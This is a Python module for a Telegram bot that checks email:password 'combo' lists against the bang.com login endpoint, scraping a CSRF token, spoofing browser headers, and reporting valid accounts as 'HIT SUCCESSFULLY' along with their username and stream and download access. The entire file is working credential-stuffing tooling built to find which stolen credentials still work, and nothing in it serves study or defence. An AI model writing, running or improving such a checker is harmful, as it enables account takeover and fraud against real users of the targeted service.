import requests
import time
from telebot import types

def process_bg_command(bot, message):
    chat_id = message.chat.id
    account_data = message.text.split()[1:]  # Get the account data from the command
    if account_data:
        total_accounts = len(account_data)
        start_time = time.time()
        results = []
        initial_message = "↯ BANG ACCOUNT\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_accounts, start_time, message.from_user.username))

        for account in account_data:
            result = check_bg_account(account)
            results.append(f"Combo: {account}\nResult => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_accounts, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide account details in the format: /bg email:password")

def check_bg_account(account):
    email, password = account.split(':')
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "origin": "https://www.bang.com",
        "referer": "https://www.bang.com/login",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin"
    }

    response = requests.get("https://www.bang.com/login_check", headers=headers)
    token = get_str(response.text, "token: '", "',")

    data = {
        "_username": email,
        "_password": password,
        "_remember_me": True,
        "_token": token
    }

    response = requests.post("https://www.bang.com/login_check", json=data, headers=headers)
    
    if "success\":true" in response.text:
        username = get_str(response.text, "username\\u0022:\\u0022", "\\")
        stream = get_str(response.text, "stream\\u0022:", ",\\")
        download = get_str(response.text, "download\\u0022:", ",\\")
        return (f"HIT SUCCESSFULLY\n"
                f"Username: {username}\n"
                f"Stream: {stream}\n"
                f"Download: {download}")
    elif "success\":false" in response.text:
        return "Invalid Credentials❌"
    else:
        return response.text

def get_str(string, start, end):
    str_ = string.split(start)
    str_ = str_[1].split(end)
    return str_[0]

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⌧ Total ACCOUNT Checked - {total_accounts}\n"
        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
        f"⌧ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
